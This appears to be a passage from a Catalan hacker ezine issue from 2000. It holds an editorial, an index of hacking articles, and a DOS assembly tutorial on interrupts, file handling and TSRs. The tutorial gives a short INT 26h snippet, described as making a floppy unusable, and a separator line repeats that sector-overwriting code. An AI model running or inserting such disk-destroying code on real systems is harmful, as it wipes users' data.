.----------------------------------------------------------------------------.
|      dBbo  .odBb.    b   Bb  b   .odBb.   ddoo 'Bb         dBBBB           |
|     dB'   dB'  'Bb ooBbo BB  Bb dB'  'Bb dB'    BB .d     dB               |
|     BB       oodBB  dB   BBBbBB    oodBB BB     BBkC     dBBBBBb           |
|     BBb     d   dB  Bb   BB  Bb   d   dB BBb    BB''b          Bb          |
|      `dBBb  'ood'b  'do  dB  P'   'ood'b  'dBBb BB  'b    dBBBB"           |
`:--------------------------------------------------------------------------:'
|                      [  CatHack!#005 - juny del 2000 ]                     |
`:--------------------------------------------------------------------------:'
|                                                                            |
| cathack.itgo.com  |  welcome.to/cathack   |   members.es.tripod.de/cathack |
|                                                                            |
`:--------------------------------------------------------------------------:'
| ########################################################################## |
| #                              IMPORTANT                                 # |
| #                              ---------                                 # |
| #  Cap membre del grup es responsabilitza dels danys que es puguin fer   # |
| #     amb la possada en practica de la informació aqui continguda.       # |
| #                                                                        # |
| ########################################################################## |
`:--------------------------------------------------------------------------:'
| Membres:                                                                   |
|   > PGB        < pecuy@ilimit.com >  BaRner        < barner@iname.com >    |
|     QUiCKSHOT  < 12389csb@comb.es >  pancake     < poptph@hotmail.com >    |
|     LopeHack <st05764@salleURL.edu>  Brainstorm <brainstorm@redestb.es>    |
|     KL4RK     < kl4rk@nettaxi.com >  Kuduk        < kuduk@lettera.net >    |
|     d0Nner   < donner@isuisse.com >  Asac-Cat   < txetxe@softhome.net >    |
|     Acastan < acastan@pie.xtec.es >  [hansi]          < msvmsv@ctv.es >    |
|     Lobo   < pumarovi@bigfoot.com >  KaBron    < kabron@mundomail.net >    |
|                                                                            |
 `--------------------------------------------------------------------------'


						   Everything comes to my mind
								  SleepWalkin'



 ____________________________________________________________________________
|////////////////// INDEX.HTML ///////////////////////////////////////|_|x|//|
|----------------------------------------------------------------------------|
|                                                                          |o|
| [ nom ]---------------------------[ autor ]-----[ tematica ]------[ id ] | |
|                                                                          | |
| Editorial                          cathack*        opinió          $01$  | |
| popASM#4 (interrupcions)           Pop.tPH         programació     $02$  | |
| Bugs & Exploits                    cathack*        hack            $03$  | |
| Humor                              Acastan         humor           $04$  | |
| Smurfing                           BaRner          hack            $05$  | |
| Varies formes de hackejar amb Win  [hansi]         hack            $06$  | |
| 1009 - 1008 - 1005                 KonstaN         phreak          $07$  | |
| Traperies amb Únix                 Pop+BaRner      hack            $08$  | |
| Ocultació de IP's                  [hansi]         hack            $09$  | |
| Traçant Virus                      Pop.tPH         virii           $0A$  | |
| Campanya contra desfilada militar  Acastan         opinió          $0B$  | |
| Links                              cathack*        hpcv            $0C$  | |
| Missatge de Redosdedos             ReDosDeDos      opinió          $0D$  | |
| Shadow Cript v2.00                 Pop.tPH         cript-asm       $0E$  | |
| Buffer OverFlow                    KL4RK           hack/crack      $0F$  | |
| Hacking BIOS                       Acastan         hack            $10$  | |
| Notícies                           BaRNer          opinió          $11$  | |
| HackMeeting BCN                    HMbcn           opinió          $12$  | |
| CFI (AttachFiles)                  cathack*        hpcv            $13$  | |
| Acomiadament                       cathack*        opinió          $14$  | |
|    ___________________________                                           | |
|___|/////// NOTE.HTML ////|x|//|__________________________________________|_|
|___|---------------------------|____________________________________________|
    | *  =   L'autor  cathack   |
    |  simbolitza tot el grup   |
    |___________________________|
    |___________________________|


						       Qui oblida el seu pasat
							  el tornarà a repetir
								-INEM KILLERS-


ÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇ
çççççççççççççççççççççççççççççççççççççççççççççççççççççççççççççççççççççççççççççç
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
çççççççççççççççççççççççççççççççççççççççççççççççççççççççççççççççççççççççççççççç
ÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇ

$01$

 ____________
|            |
| Editorial: |
|____________|

Sí,  ja  tornem a ser  aqui,  seguim donant  la tabarra  amb  el  hack! . jeje
La  passada CatHack#4  pretenia estar  més carregadeta, però hem tingut alguns
contratemps amb alguns textes i els ficarem en aquesta :) -  Encara segueix en
peu lo de  la kdd en  xarxa... per cert,  hem perdut  el domini de webjump que
parlavem en  la pasada revista :(( són uns vils! - Per d'altre banda el domini
que  segueix més  actiu és el de  cathack.itgo.com  - Poc a poc anem creant un
projecte  comú més  actiu,  amb més col·laboracions  i idees, però tot hi així
avancem massa poc a poc.  Esperem que  us agradi la ezine i aprengueu força, i
recordeu lo de sempre (no ens cansarem mai :) ESPEREM LA VOSTRA COL·LAVORACIÓ!

Sense la vostra  ajuda la  ezine no avançarà,  i la comunitat hack a catalunya
seguirà essent reduïda,  no feu cas dels mitjans de comunicació que parlen del
hack  com  una  "delincuència" ni  tp  és  una  "moda",  és  una afició, ganes
d'aprendre, millorar  els sistemes de  seguretat i erradicar la ignorància que
domina en temes com l'informàtica en general (el 70% de la població ;), tot-hi
així  sempre  ens podem  trobar  casos  de gent  que  no té  ni idea  pero que
n'aparenta,  generalment amb  prepotència i  que només té  ganes de fer quatre
"coses vistoses" per  sentir-se superior als  seus amics,  comúnment anomenats
lammers, i fins hi tot ens  trobariem amb la gent que té la paraula "lammer" a
la punta de la llengua i que  tota l'estona  l'utilitza...(ells tb ho són). És
una critica  constructiva, primer apren,  practica i ensenya, i després podràs
obrir la boca.

S'han obert algunes llistes noves:
      hackmeeting-request@sindominio.net  -> amb "subscribe" al subject
      redosdedos-subscribe@egroups.com    -> Llista del grup ReDosDeDos

Bueno, poca  cosa més,  felicitar  al Txetxe pel  seu fill :) i esperar que us
agradi força el nostre treball, li tregueu profit i seguiu aprenent contra les
adversitats que l'entorn ens aplica (escola, treball, etc...).



						  Calia que tot canvies perquè
						      tot seguís essent igual?
									B.E.I.

______________________________________________________________________________
/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
Mov.Ax,3h.Mov.Cx,10h.Mov.Dx,0h.Int.26h.Jmp.100h.Db.46.55.43.4B.20.48.21.21.21h
\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
==============================================================================

$02$


%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\

  popASM v4.00           by Pop.tPH

%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\%\


INTro:                            
++++++                            

Benvinguts a la 3a part de l'article sobre programació en ensamblador, poc a
poc anirem pujant de nivell. Pero crec que en aquest article aprendreu bastant
ja que parlarem de les >> Interrupcions << , si!, per fi podreu començar a fer
coses utils i deixar-nos de teories absurdes. (o no?)


INTerrupcions:                    
++++++++++++++                    

Les interrupcions són crides a procesos cargats en memoria usease, un hardware
o un software al arrencar deixen obertes unes a crides a ells per poder fer
diverses funcions, aixi mateix podem separar en dos grups:

	-Interrupcions de hardware
	-Interrupcions de software

Les de hardware són "estandars" ( no sempre ) en quasi tots els PCs, aquestes
són més o menys (no les diré totes!) aquestes:

	INT 10h -> video
	INT 13h -> accés directe a disc (desde BIOS)
	INT 16h -> teclat
	INT 17h -> impresora
	INT 1Ah -> BIOS (hora/data/random...)
	INT 25h -> Read Sector
	INT 26h -> Write Sector
	INT 27h -> Finalitzar programa i mantenir-lo en memòria.
	INT 2Fh -> multiplex (himem.sys / windows)
	INT 80h -> LINUX (No parlaré en aquest article...) :P~~~ mmh linux
	...

I les de software són variades, encara que només ens centrarem en una, la
INT 21h (la interrupció del DOS), amb ella podrem fer de tot en msdos, (que
es noti que encara no he parlat de windows!!)-- Pero no tot es bo sempre, tot
té una part dolenta, i quina és? doncs, que l'execució d'interrupcions de
software és més lenta que la de hardware i que a més si emprem les de soft,
ens podem trobar amb problemes de compatibilitat (cada cop menys probable)-

Pero en si que és una interrupció?, la interrupció vé marcada per un vector
(si, podem canviar els vectors i fer interrupcions noves), aquest vector marca
una possició de memoria on executarà una sèrie d'ordre (normalment INs i OUTs)
o sigui, les interrupcions serveixen per facilitar-nos la vida, pero potser
ens el relenteix massa.-Aixi que utilitzeu-les pero sense abusar, quan més
endavant us ensenyi a utilitzar els ports ja optimitzarem aquestes int.

Cada interrupció (de les 256 que n'hi han (0FFh) conté a dins seu 256 funcions
que les podrem demanar a través del registre AH. A més també utilitzarem els
altres registres (BX,CX,DX,SI,DI...) com a modificadors (si esteu molt
interessats busqueu-vos la llista de Ralf Brown.- Normalment els registres
s'utilitzen aixi:

	AX = funció (AH) modificador (AL) -> AL molt poc utilitzat
	BX = atribut (de fitxers, de caracters...)           
	CX = contador                                        
	DX/SI/DI = apuntador de IP                           
	ES/CS/DS = apuntador de segment
	BP = Apuntador de base (base pointer)
	SS = Stack Segment (es podriem haver buscat unes altres lletres no?)



Model basic de programació en ASM:                           
++++++++++++++++++++++++++++++++++                           

Molt bé, ja tenim la teoria, passem a l'acció, potser en cursos anteriors no
us vaig deixar gaire clar com programar en asm (perdó :P) - Aixi que us ho
explico ara, per programar en asm (suposem que treballem amb el TASM/TLINK)
podem fer-ho de dues formes: per models o per segments, les dues coses venen
a ser el mateix, l'unic que el model és un segment definit pel compilador i
el segment el definim nosaltres:  

-----[ exemple de programació per model ]------

.model small                      
.code                             

	; aqui es on anira el codi

end                               

-----[ exemple de programació per model ]------

on diu .code podem possar també altres segments com .data o .stack (pero per
estalviar-nos tamanys inutils no els utilitzarem encara. Fixeu-vos que posem
.model small on diu small podem possar flat, tiny, etc... pero de moment, si
treballem en msdos no ens caldran més models, small=16bits.  

Ara posem un exemple de programació amb segments:

-----[ exemple per segments ]------

nom_qualsevol SEGMENT ; a continuació podem possar 'code' o 'stack' o 'data'

	; aqui va el codi

nom_qualsevol ENDS
end    

-----[ exemple per segments ]------

Molt bé, ara ja tenim el model i ja podem compilar...si ens molesta que ens
dongui l'error de *WARNING* No Stack, doncs li fotem .stack i ja ta. Un cop
compilat usease: (no cal ficar extensió).
	TASM    filename     -> es compila a .OBJ
	TLINK   filename     -> es pasa el OBJ a EXE
	EXE2COM filename     -> es pasa el EXE a COM (reducció de tamany)

L'executeu i ja està. Pero que passa pq es penja?? doncs pk hem fet un codi
que no li diu que retorni al DOS, com fer-ho? doncs amb la INT21h! aquesta
funció és la 4Ch o sigui si fem:
	     
	mov ah, 4Ch
	int 21h

sortirem a msdos (aixi que l'haurem de possar sempre en qualsevol programa
a no ser que volguem k la maquina es quedi penjada en una rutina i no surti.
pero un moment!, que passa amb AL?, amb aquesta funció AL serveix per designar
el valor de ERRORLEVEL que tornarà al sortir del programa...us enrecordeu de
programar virus batch?

Una cosa molt important es assignar altres segments que siguin igual al cs
(code segment) ja que aixi, per exemple, moltes funcions busquen les posicions
de memoria en ds:dx o coses aixi, i per tant no encaixaria, formes de solu-
cionar-lo?               

1.- PUSH/POP                                                 
	És recomenable utilitzar aquesta tecnica ja que ens estalviarem
	emprar la 2a durant tot el programa, encara que si ens importa
	el tamany sera millor que utilitzem la 2a tecnica, ja que amb
	aquesta, el programa ocuparà 4 bytes més que l'altre.
	Aquesta tècnica s'empra aixi: (aixo cal ficar-lo al principi del
	codi del programa.

	push cs
	pop ds

2.- 100h (tamany del PSP)
	Sempre que ens referim a una "db" la seva possicio sera igual a
	[db] + 100h, o sigui, mirem el codi següent:
	;-------[codi]
		mov ah, 09h
		lea dx, frase + 100h
		int 21h
			 
		frase db 'frase$'
	;-------[codi]                                       

Podeu fer-ho de la forma que volgueu.

Bé doncs ara us faré un ràpid repas a les funcions més importants del DOS(21h)


INTerrupció 21h:
++++++++++++++++

AH = 1h ----> llegeix del teclat un chr amb echo i el graba en AL

AH = 8h ----> llegeix del teclat un chr sense echo i graba en AL

AH = 0Ah ---> llegeix cadena de texte desde el teclat fins que es prem
	      return, ho graba en DS:DX

AH = 2h ----> escriu un caracter sense atributs.
     DL = valor ascii del caracter
	exemple:
		mov ah, 02h
		mov dl, 'A'
		int 21h

AH = 9h ----> escriure cadena de texte.
     DS:DX = possició de la cadena de texte. (la cadena acaba amb el simbol $)
	exemple:
		push cs
		pop ds  ; posem ds a 100h (on comença el CS)

		mov ah, 09h   
		lea dx, frase ; es el mateix k possar mov dx, offset frase
		int 21h

		mov ah,4ch
		int 21h

		frase   db      'Aixo es una frase$'

AH = 4Bh ----> Executar programa
     DS:DX = lloc on està el nom del programa ( prog   db  'pop.com',0 )
     AL = tipus d'obertura: 00 = carga i executa
			    01 = carga pero no executa
			    03 = carga overlay
			    04 = carga i executa en segon pla.

AH = 50h --> Set current process ID (possició del PSP)
     BX = possició del nou segment


AH = 51h --> Get current process id (get PSP adress)
     ->BX = retorna la possició del PSP

** AH=51h seria el mateix que fer push cs | pop bx


AH = 4Ch ----> Retornar el control al DOS
     AL = ERROLEVEL
		   


Treballant amb fitxers:
+++++++++++++++++++++++                                      
	     
Pot ser molt util treballar amb fitxers, obrirlos, tancar-los, crear-ne,
borrar-ne, canviar-lis el nom, etc... 
El DOS (i el win, etc..) treballa amb 'handles', o sigui, quan obra un fitxer
li assigna un valor, i a través d'aquest valor treballa sobre el fitxer,
aquest valor és de 16 bits per lo tant podrem obrir simultaniament uns 65536
fitxers alhora. (cosa bastant improvable)- 

Per treballar amb fitxer utilitzarem la interrupció del DOS (21h):

	AH = 3Ch        -> funció de crear fitxer
		CX    = atribut del fitxer (0=normal)
		DS:DX = apuntador al nom del fitxer:
			aquest nom ha d'estar limitat per 0 o sigui:
			file_name       db      'filename.txt',0

	AH = 3Dh        -> obrir fitxer
		AL    = tipus d'obertura
			  0 = lectura
			  1 = escriptura
			  2 = lectura/escritura
		DS:DX = nom del fitxer (igual que a dalt)
		-> AX = la interrupció ens grabarà el handle en el registre
			AX, aixi que seria bo grabar-lo en una possició de
			memòria per si de cas el perdem.
				;code
				mov handle, AX
				;data
				handle dw 0 ; handle és un espai de 16bits
		-> CF = Carry flag, sino pot obrir-lo dona CF=1
			      
	AH = 40h        -> escriure en fitxer
		BX    = nombre 'handle' assignat al fitxer
		CX    = nombre de caracters a escriure
		DX    = possició inicial de memoria d'on començarà a llegir
			per escriure en el fitxer (llegirà CX caracters).

	AH = 42h        -> posicionar dins del fitxer
		AL    = possici¾
			0 = desde inici del fitxer
			1 = desde possici¾ actual
			2 = desde final del fitxer
		CX:DX = offset de possici¾
		BX    = handle
	       -> retorna la nova possició a DX:AX
            <nota> aquesta int mal utilitzada pot penjar el sistema
             (si ens possicionem fora dels limits del fitxer).

	AH = 3Fh        -> Read from file
		BX    = file handle
		CX    = nombre de bytes a llegir (caracters)
		DS:DX = lloc on es grabarà el que llegeixi.


	AH = 13h        -> Borrar fitxer
		DS:DX = filename,0
	
	AH = 3Eh        -> tancar fitxer
		BX    = nombre 'handle' assignat al fitxer.

	AH = 56h        -> Renombrar fitxer
	       DS:DX -> nom del fitxer a renombrar
	       ES:DI -> nou nom

	


Modificant els vectors:
+++++++++++++++++++++++
Existeixen dues funcions de les interrupcions que serveixen per fixar i
llegir els vectors de les interrupcions, o sigui, saber a quina IP ens
direcciona. Aquestes són:

AH = 35h        -> Get_Interrupt_Vector
	AL      -> Interrupcio
	->ES:BX -> Direcci¾ de la interrupci¾
				    
AH = 25h        -> Set_Interrupt_Vector
	AL      -> Interrupcio
	DS:DX   -> Direcci¾ del nou vector

AH = 31h        -> Mantenir-se resident.
	DX      -> nombre de paragrafs a mantenir residents

--> Un petit exemple d'un TSR que es mantÚ clavat en mem=ria
    capturant la interrupci¾ 21h i dibuixant un quadre de color
    a la part superior esquerra, cada cop que s'executa la int21h


	-----[TSR]--------------
code    segment 
	assume cs:code,ds:code
	org   100h             
start:
	jmp     instalar

old_21  dd      2

new_21:
	push di
	push ax
       push 0B800h
       pop es
       xor di,di
       in ax, 40h              ; Color aleatori
       mov al,'¦'
       stosw
	pop ax
	pop di

	jmp     cs:[old_21]                     ;Salta a la int original.
instalar:
	mov     ax, 3521h
	int     21h
	mov     word ptr old_21, bx     
	mov     word ptr old_21+2, es   ; Get old int21h vector

	mov     ax,2521h          
	push    cs
	pop     ds
	mov     dx, offset new_21
	int     21h      ; Set new int21h vector

	mov     ah, 31h
	mov     dx, 30d  ; Be resident
code ends 
end start 
	-----[TSR]--------------



INTerrupció 10h: VIDEO
++++++++++++++++++++++

Amb aquesta interrupció treballarem amb el hardware, més en concret amb la
targeta de video, aqui podrem canviar el mode grafic, dibuixar pixels,
escriure caracters, cadenes de texte, amb atributs especials, etc...

	AH = 03h        -> Get_Cursor_Position
		-> DX  = retorna la possicio del cursor actual
			DH = fila
			DL = columna

	AH = 02h        -> Set_Cursor_Position
		DX      = en dx li diem on volem que es posi (fila/columna)

	AH = 13h        -> Escriure cadena de texte
		BL      = atribut (07h)
		CX      = nombre de caracters de la cadena
		ES:BP   = posició inicial de la cadena
		DX      = fila/columna

	AH = 0Eh        -> Escriu un caracter
		AL      = valor ascii del caracter.

	AH = 00h        -> Set_Video_Mode
		AL      = mode: 10h - 80x25x16 (text/grafic)
				11h - 640x480x2 (blanc/negre)
				12h - 640x480x16
				13h - 320x200x256

	AH = 0Ch        -> Dibuixar pixel
		AL      = color
		CX      = possició X
		DX      = possició Y                

	AH = 0Dh        -> Llegir color del pixel
		CX      = columna
		DX      = fila
		->AL    = color del pixel


B800:0000 -> segment CGA:                           
+++++++++++++++++++++++++                           

Si volem tindre un accés directe a la pantalla (en mode texte) i per tant,
un accés molt més ràpid podrem fer-ho a través d'aquest segment: 0B800h
(si busquem més velocitat d'accés us espavileu amb la DMA)- :P
Doncs bé, aquest segment marca el principi de la video ram, i guarda la
informació dels caracters amb 'paraules' (words= 32bits) de la següent forma:
	atribut(16bits) caracter(16bits)

Si calculem 80x25 (columnes/files) veurem que ens dona 2000d, o sigui en una
pantalla caben 2000 caracters, aquests caracters els podrem llegir utilitzant
repnz aixi:                                         

	; Aquest programa netejarà la pantalla de color blanc .---->
	;-----------------------------------------------------'
	mov ax, 0B800h
	push ax
	pop es          ; ES = B800h (ExtendedSegment) per l'stosw
	xor di,di       ; DI = 0
	mov ax, 0720h   ; Atribut 07h (blanc) Caracter 20h (espai)
	mov cx, 2000d   ; repetir el repnz 2000 cops              
	repnz stosw     ; Graba en ES:DI de word en word AX incrementant DI
	;      |           CX vegades (2000) (repnz)
	;      |
	;      `--------> STOSW: StoreWord, aquesta ordre graba en ES:DI
	;                 un word (16bits) contingut en el registre AX
	;                 Per la seva contra també tenim la LODSW (LoadWord)
	;                 que fa el mateix pero llegeix :)


INT 13h: ACCÉS DIRECTE A DISC:
++++++++++++++++++++++++++++++

AH = 02h -> LLegir sector a memoria
      AL = nombre de sectors a llegir
      CH = 8 baixos bits del cilindre (0)
      CL = nombre de sector 1-63) (1)
      DH = capþal
      DL = Unitat (7 per hd)
      ES:BX = data buffer
      -> CF = 1 si dona error

AH = 03h -> Write Disk Sector
     AL = nombre de sectors
     CH = 8 baixos bits del cilindre
     CL = sector (1-63)
     DH = capþal
     DL = unitat ( bit 7 per hd )
     -> CF=1 si dona error

AH = 05h -> Format track of fixed disk
     AL -> interlave value
     ES:BX -> 512-byte format buffer
     CH -> cilindre
     CL -> alts bits del cilindre
     DH -> capþal
     DL -> unitat
      -> CF quan dona error


AH = 0Ah -> Read long sector
     AL = nombre de sectors
     CH = 8 bits baixos del cilindre (0)
     DL = unitat (80h = primari, 81h=secundari )
     ES:BX = lloc on es grabarà la data
     -> CF=1 si dona error

AH = 0Bh -> Write long sector
     AL = nombre de sectors
     CH = 8 bits baixos
     CL = sector numero
     DH = Capçal
     DL = Unitat (80h=primari, 81h=secundari)
     ES:BX = data buffer
     -> CF=1 si dona error

INT 16h: TECLAT
+++++++++++++++

La interrupció 16h es la encarregada del teclat. Amb ella podrem canviar/
llegir l'estat del teclat, llegir un caracter, una cadena de texte, etc..
	     
	AH = 00h        -> Llegeix una pulsació sense echo pero amb wait
		->AX    = graba en AX la tecla polsada:
				AH = codi de teclat
				AL = codi ascii

	AH = 01h        -> Mira si es prem una tecla (sense wait ni echo)
		->AX    = graba el resultat en AX
				AH = codi de teclat
				AL = codi ascii

* - El codi de teclat i el codi ascii el podeu trobar...si us mireu l'ajuda
    del Qbasic ho trobareu, sino busqueu porai.


INT 17h: Impressora
+++++++++++++++++++

AH = 00 -> Imprimir un caracter
     AL = caracter
     DX = printer number (00h -02h)
     -> AH : retorna l'status:
	    BITS     ESTAT:
	     7        normal
	     5        sense paper
	     4        seleccionada
	     3        error de comunicació
	     0        sobrepasa el temps d'espera

AH = 01 -> Inicialitza el port
     DX = printer number (00 - 02)

AH = 02 -> Mirar l'estat de la impresora
     DX -> printer number (00 - 02)
     -> AH: retorna l'estat (mirar la taula d'adalt)

AH = 03 -> Escriure una cadena de texte.
     DX = printer port number (00- 02)
     CX = nombre de caracters
     DS:SI: localització de la cadena de texte



INT 1Ah: BIOS
+++++++++++++
Amb aquesta interrupció podrem conseguir la data, nombres aleatoris, etc..

	AH = 00h        -> Get_Random_Number (són els tics desde les 12:00)
		-> DX   = Ens graba en DX els tics (si volem realment aleatori
			  serà millor que agafem DL (varia més sovint).

	AH = 04h        -> Get_date_from_BIOS
		-> CH   = any
		-> DH   = mes
		-> DL   = dia
	AH = 02h        -> Get_real_time_clock
		->CH      = hora
		->CL      = minuts
		->DH      = segons

	AH = 03h        -> Set_real_time_clock
		CH    = hora  
		CL    = minuts
		DH    = segons

	AH = 04h        -> Get_date
		->CH  = Century
		->CL  = Any   
		->DH  = mes   
		->DL  = dia   

	AH = 05h        -> Set_date
		CH    = Century
		CL    = any   
		DH    = mes   
		DL    = dia   


INT 25h: Read Sector          
++++++++++++++++++++
AL    = unitat (A=0, B=1, C=2,...)
CX    = nombre de sectors a llegir (si es diferent de FFFFh és per discs
	de menys de 32MB, si és FFFFh agafa discs de 32MB a 2GB
DX: lloc on comença a llegir
DS:BX = Lloc on grabarÓ els bytes llegits


INT 26h: Write Sector
+++++++++++++++++++++
AL    = unitat (A=0, B=1)
CX    = Nombre de sectors a escriure
DX    = Sector en que comenþarÓ a escriure
DS:BX = Lloc d'on llegirÓ els bytes a escriure

exemple: Aquest programa deixa inutil un disket:
      mov al,0h
      mov cx,1h
      mov dx,0h
      int 26h


INT 27h: Finalitzar i mantenir en memòria
      DX= Nombre de bytes a mantenir en memòria
      CS= Segment del PSP


INT 2Fh: MultiPlex
++++++++++++++++++
Aquesta interrupció ens permetrà saber diverses infos del sistema actual,
(el programa escrit per Acastan en la CatHack!#003 per robar els passwords)
utilitza aquesta interupció. Jo us escric un codi que us permetrà saber si
teniu cargat el himem.sys (o sigui, si hi ha XMS instal·lada o no). L'us
d'aquesta interrupció és molt "sibarita" ;) aixi que no us explicaré gran
cosa, pq la teniu tota en les llistes de Ralf Brown.

;----------------------------------------------------------------------. 
; XMS DETECTOR         - by Pop.tPH -  codi basat en un texte de 29A   |
;----- - -- - -  -   -   - -   -   -     -      -     ·   ·     ·    · '
.model small
.code

push cs
pop ds          ; 'descorrem' la data

	mov ah, 43h     ; funció de detectar XMS
	int 2Fh         ; interrupció multiplex
	cmp al, 80h     ; comprova el resultat
	jnz no_xms      ; salta si no hi ha xms

	mov ah, 09h
	lea dx, si_xms
	int 21h         ; escribim la frase si_xms

quit:
	mov ah, 4Ch
	int 21h         ; surt al dos

no_xms:
	mov ah, 09h
	lea dx, no_xms
	int 21h         ; escriu la frase no_xms
	jmp quit

;-------[ VDS = Virtual Data Segment ]----- (parida al canto :)

si_xms  db      'XMS instal·lat$'
no_xms  db      'XMS no instal·lat$'

end
;----- - -- - -  -   -   - -   -   -     -      -     ·   ·     ·    · .
; XMS DETECTOR         - by Pop.tPH -  codi basat en un texte de 29A   |
;----------------------------------------------------------------------'


MACROs: include.files:
++++++++++++++++++++++
Les macros son un seguir de ordres dispossades per estalviar-nos copiar
moltes vegades les mateixes ordres, i utilitzar-les amb modificadors i demés
per facilitar les coses. Pero també les podem utilitzar com a include.files
i aixi poder programar (o fer pseudo-llenguatges com el PL/M :) llavors per
incloure les inc.files haurem de ficar (abans de començar el codi: o sigui
entre .model i .code (o abans de segment) caldra ficar aixo:"include filename"
i ja ta. L'estructura d'aquests fitxers és la següent:

;-----[ macro.inc ]------
nom_d'ordre_nova        MACRO   var1, var2, var3
		mov ax, var1
		mov bx, var2
		int var3
			ENDM
;-----[ macro.inc ]------
	
llavors per utilitzar aquesta ordre farem el codi aixi:
	
; codi k importa include file
;-----------------------------
.model small
include macro.inc
.code   
	nom_d'ordre_nova 4C00h 0000h 21h
end     
;-----------------------------



Optimitzant el codi:
++++++++++++++++++++
	
Per optimitzar el codi haurem de intentar fer que executi el minim de ordres
usease el minim nombre de bytes i cicles. Per exemple enlloc de fer:
	
	mov ax, 0000h           ; 5 bytes -.__.-- Són equivalents
	xor ax, ax              ; 2 bytes -'
	
si volen 0FFFFh doncs fem:
	xor ax, ax      ; 2 bytes -.___.-- 3 bytes (<5)
	dec ax          ; 1 byte  -'
	
que volen 0001h doncs
	xor ax, ax      ; 2 bytes -.___.-- 3 bytes (<5)
	inc ax          ; 1 byte  -'
	     
Una altre tecnica es la de fer calls per coses que repetim molts cops, aixi,
el codi es resumeix, ja que no haurem de repetir el mateix moltes vegades.

Existeix una ordre per repetir una altre tantes vegades com CX li digui:
	REPNZ ordre ;(rep not zero)

	Per exemple, si volem incrementar 10 cops ax, ho podem fer aixi.
		repnz inc ax

	Realment aixo és un exemple estúpid ja que podriem haver fet
	add ax, 10d, pero bé, espero que hagueu entés el concepte :P  

Per evitar fer un codi inmensament gran eviteu usar segments inutils com
.stack o .data (excepte quan treballeu en 32bits (windows) q són necessaris).

VDS(Virtual Data Segment): Aixo es una invenció meva per estalviar-nos 
l'inutil .data segment, i reduïr el tamany final del programa, es tracta en
utilitzar una zona inaccessible del codi per ficar la data, o sigui, en una
zona limitada per un movah,4ch/int21h o per un jmpXX (a la qual no arribi cap
rutina) ficar tota la data allà:                                       
O sigui:                                                               
	handle  dw      0                   ; una word buida (0000h)   
	frase   db      'POP!', 0A0Dh, 24h  ; 0A0Dh = return // 24h = $
	nozing  db      200 dup (?)         ; 200 espais buits (0x200h)

EXE2COM: Aquest programa junt amb el exe2bin (de la m$), serveixen per treure
el codi possant-lo directament a la possició 0 i per tant reduïr el codi a la
minima expressió, però només el podrem utilitzar recent compilat, podrem
treure codis de 20 bytes i coses aixi. :) util per virus i programes pel Boot.

MOV AX, 12      ; 4 bytes -----------------------. 
						  |
push 12         ; 2 bytes --.__.-> 3 bytes vs 4 <-'
pop ax          ; 1 byte  --'


Variables:
++++++++++   
Un cosa molt util es crear "pseudo-variables", ja que podrem treballar amb
elles com si fóssin registres, sumant, restant, movent, etc... i lo millor
de tot es que podem fer-los del tamany que volguem (8,16,32bits) com? doncs
molt facil, definint-les amb DB DW i DD (respectivament DefineByte(8),
DefineWord(16) i DefineDoubleWord(32)), per fer-ho agafarem una zona VDS
(VirtualDataSegment), o sigui fora del codi del programa (despres del final)
o sigui:

;---[ VDS es troba aqui: ]---
.model small                 
.code
	mov ah,4Ch
	int 21h   
	
	; VDS --> Aquesta part d'aqui esta fora del codi (ja que el codi
	para a sobre (i a no ser k fem un salt aqui no s'executara aquesta
	part).-
end
;---[ VDS es troba aqui: ]---

Ara ja sabem on ficar-ho, doncs ara anem a definir, possem-li un nom a la
variable (que no sigui cap opcode (mov, rep, inc...)) per exemple pollastre
i volem que sigui un pollastre de 16 bits, com ax, o bx llavors fem:

pollastre       dw      ?

el interrogant vol dir que el valor es 0 o sigui la zona de memoria del
pollastre valdra 0000h, si, seria el mateix fer:

pollastre       dw      0000h

pero que més dona?? Ara, ja tenim la variable creada, ara ja podem moure
sumar, restar, etc... aixi:

mov pollastre, 110h     
add pollastre, 10h
xor pollastre, pollastre
... ... , ...


JUMPS:
++++++
Quan fem programes industrials (coses grans), segurament no podrem fer
salts, ja que el programa canviara de segment i per tant ens donara error
al compilar ja que no permet salts tant llargs, la forma de solucionar-ho
es escribint "jumps" despres del .model, d'aquesta forma:
	.model small
	jumps
	.code


BYTE PTR/WORD PTR:
++++++++++++++++++
Una cosa es parlar de 5000h i l'altre de byte ptr cs:[5000h], en el primer
estem parlant del nombre 5000h i en el segon cas del valor del byte situat
en la possició 5000h, aixo ens pot ser molt util, quan volguem llegir o
escriure en possicions de memoria (tb podem utilitzar repnz, pero aixi es
més fàcil) -- per exemple si volem moure una cadena de texte escrita en
5000h haurem de fer un loop aixi:                                     

	mov cx, numero_de_caracters_a_llegir
		fer_loop:            
			mov ah,2
			mov dl, byte ptr [ 5000h + si ]
			int 21h
			inc si
		loop fer_loop

Si per exemple volguessim llegir de 16 bits en 16 bits utilitzariem el
WORD PTR, que funciona igual pero amb l'unica diferencia que el resultat
l'hem de grabar en un registre de 16bits i no de 8 com en el cas anterior.



XLAT: translate
+++++++++++++++
Aquesta ordre equival a MOV AL, [BX+AL], pero amb l'unica diferencia que
XLAT ocupa 1 byte i MOV ocupa 3 bytes, pero com que és una ordre amb desus
la intel ha decidit optimitzar la ordre MOV (molt utilitzada) pq es pugui
calcular amb un sol cicle i en canvi la XLAT la calcula en 4 cicles, pero
sempre va bé en casos de programes i virus petitons.
